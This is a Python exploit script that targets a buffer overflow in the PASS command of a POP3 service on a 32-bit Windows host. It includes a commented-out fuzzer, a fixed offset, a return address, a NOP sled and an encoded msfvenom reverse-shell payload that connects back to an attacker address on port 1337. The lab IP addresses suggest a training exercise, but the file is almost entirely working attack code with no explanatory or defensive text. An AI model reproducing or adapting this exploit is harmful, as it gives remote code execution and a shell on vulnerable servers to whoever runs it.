#!/usr/bin/env python3
# Exploit by Mardcore
# Windows Buffer Overflow 32 bits
# offset = 2606
# badchars = \x00\x0a\x0d

"""
#!/usr/bin/env python3

import socket, time, sys

ip = "192.168.18.129"

port = 110
timeout = 5
prefix = "PASS "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      s.send(b'USER mardcore' + b'\r\n')
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(string.encode() + b'\r\n')
      s.send(b'QUIT' + b'\r\n')
      s.close()
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
"""

import socket

ip = "192.168.18.129"
port = 110

prefix = b"PASS "

offset = 2606

overflow = b"A" * offset

retn = b"\x8f\x35\x4a\x5f"

padding = b"\x90" * 16

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.18.128 LPORT=1337 -f python -b '\x00\x0a\x0d' -e x86/shikata_ga_nai
buf =  b""
buf += b"\xd9\xca\xd9\x74\x24\xf4\xb8\x41\x18\xa8\xa3\x5f\x33"
buf += b"\xc9\xb1\x52\x31\x47\x17\x03\x47\x17\x83\x86\x1c\x4a"
buf += b"\x56\xf4\xf5\x08\x99\x04\x06\x6d\x13\xe1\x37\xad\x47"
buf += b"\x62\x67\x1d\x03\x26\x84\xd6\x41\xd2\x1f\x9a\x4d\xd5"
buf += b"\xa8\x11\xa8\xd8\x29\x09\x88\x7b\xaa\x50\xdd\x5b\x93"
buf += b"\x9a\x10\x9a\xd4\xc7\xd9\xce\x8d\x8c\x4c\xfe\xba\xd9"
buf += b"\x4c\x75\xf0\xcc\xd4\x6a\x41\xee\xf5\x3d\xd9\xa9\xd5"
buf += b"\xbc\x0e\xc2\x5f\xa6\x53\xef\x16\x5d\xa7\x9b\xa8\xb7"
buf += b"\xf9\x64\x06\xf6\x35\x97\x56\x3f\xf1\x48\x2d\x49\x01"
buf += b"\xf4\x36\x8e\x7b\x22\xb2\x14\xdb\xa1\x64\xf0\xdd\x66"
buf += b"\xf2\x73\xd1\xc3\x70\xdb\xf6\xd2\x55\x50\x02\x5e\x58"
buf += b"\xb6\x82\x24\x7f\x12\xce\xff\x1e\x03\xaa\xae\x1f\x53"
buf += b"\x15\x0e\xba\x18\xb8\x5b\xb7\x43\xd5\xa8\xfa\x7b\x25"
buf += b"\xa7\x8d\x08\x17\x68\x26\x86\x1b\xe1\xe0\x51\x5b\xd8"
buf += b"\x55\xcd\xa2\xe3\xa5\xc4\x60\xb7\xf5\x7e\x40\xb8\x9d"
buf += b"\x7e\x6d\x6d\x31\x2e\xc1\xde\xf2\x9e\xa1\x8e\x9a\xf4"
buf += b"\x2d\xf0\xbb\xf7\xe7\x99\x56\x02\x60\x66\x0e\x1e\xf0"
buf += b"\x0e\x4d\x1e\xf5\xf7\xd8\xf8\x9f\x17\x8d\x53\x08\x81"
buf += b"\x94\x2f\xa9\x4e\x03\x4a\xe9\xc5\xa0\xab\xa4\x2d\xcc"
buf += b"\xbf\x51\xde\x9b\x9d\xf4\xe1\x31\x89\x9b\x70\xde\x49"
buf += b"\xd5\x68\x49\x1e\xb2\x5f\x80\xca\x2e\xf9\x3a\xe8\xb2"
buf += b"\x9f\x05\xa8\x68\x5c\x8b\x31\xfc\xd8\xaf\x21\x38\xe0"
buf += b"\xeb\x15\x94\xb7\xa5\xc3\x52\x6e\x04\xbd\x0c\xdd\xce"
buf += b"\x29\xc8\x2d\xd1\x2f\xd5\x7b\xa7\xcf\x64\xd2\xfe\xf0"
buf += b"\x49\xb2\xf6\x89\xb7\x22\xf8\x40\x7c\x52\xb3\xc8\xd5"
buf += b"\xfb\x1a\x99\x67\x66\x9d\x74\xab\x9f\x1e\x7c\x54\x64"
buf += b"\x3e\xf5\x51\x20\xf8\xe6\x2b\x39\x6d\x08\x9f\x3a\xa4"

postfix = b""

buffer = prefix + overflow + retn + padding + buf + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  s.recv(1024)
  s.send(b'USER mardcore' + b'\r\n')
  s.recv(1024)
  print("Sending buffer...")
  s.send(buffer +  b'\r\n')
  print("Done!")
except:
  print("Could not connect.")